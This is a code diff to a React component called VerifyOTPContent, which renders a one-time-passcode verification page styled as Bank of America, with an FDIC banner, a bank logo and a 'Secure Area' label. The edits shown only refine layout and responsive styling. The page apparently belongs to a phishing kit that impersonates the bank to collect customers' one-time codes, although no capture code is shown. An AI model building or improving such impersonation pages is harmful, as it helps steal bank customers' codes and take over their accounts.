@@ -116,17 +116,17 @@ function VerifyOTPContent() {
     <div className="min-h-screen flex flex-col bg-white">
       {/* FDIC Banner */}
       <div className="bg-[#f5f5f5] border-b border-[#ddd]">
-        <div className="max-w-[600px] mx-auto px-4 py-1 text-center">
-          <span className="text-[10px] text-[#666]">
-            Bank of America deposit products: <strong>FDIC</strong> FDIC-Insured
-          </span>
+        <div className="max-w-[600px] mx-auto px-4 py-1.5 md:py-1 text-center">
+          <p className="text-[10px] md:text-[11px] text-[#666] font-normal leading-tight">
+            Bank of America deposit products: <strong className="font-bold whitespace-nowrap">FDIC</strong> FDIC-Insured
+          </p>
         </div>
       </div>
 
       {/* Header */}
       <header className="bg-white border-b border-[#ddd]">
-        <div className="max-w-[600px] mx-auto px-4 py-2.5 flex items-center justify-between">
-          <div className="flex items-center gap-3">
+        <div className="max-w-[600px] mx-auto px-4 py-2.5 flex items-center justify-between gap-2 overflow-hidden">
+          <div className="flex items-center gap-3 shrink-0">
             <Image 
               src="/header.png" 
               alt="Bank of America" 
@@ -136,11 +136,13 @@ function VerifyOTPContent() {
               priority
             />
           </div>
-          <div className="flex items-center gap-1 text-[10px] text-[#666]">
-            <svg className="w-3 h-3" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
-            </svg>
-            <span>Secure Area</span>
+          <div className="flex items-center gap-1 text-[10px] text-[#666] shrink-0 whitespace-nowrap">
+            <div className="flex items-center gap-1">
+              <svg className="w-3 h-3 shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
+              </svg>
+              <span className="hidden xxs:inline">Secure Area</span>
+            </div>
           </div>
         </div>
       </header>
